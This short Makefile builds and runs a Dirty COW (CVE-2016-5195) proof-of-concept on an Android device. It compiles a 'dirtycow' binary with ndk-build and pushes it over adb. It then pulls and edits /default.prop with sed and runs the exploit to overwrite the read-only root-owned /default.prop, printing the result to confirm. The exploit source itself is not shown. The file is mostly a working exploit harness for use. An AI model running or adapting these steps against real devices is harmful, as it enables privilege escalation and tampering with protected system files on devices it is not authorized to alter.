
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow

run: push
	adb pull /default.prop default.prop
	sed -i.bak s/ADDITIONAL_DEFAULT_PROPERTIES/ADDIRTYCOW_DEFAULT_PROPERTIES/g default.prop
	adb push default.prop /data/local/tmp/default.prop
	adb shell '/data/local/tmp/dirtycow /default.prop /data/local/tmp/default.prop'
	adb shell 'cat /default.prop'

clean:
	rm -rf libs
	rm -rf obj

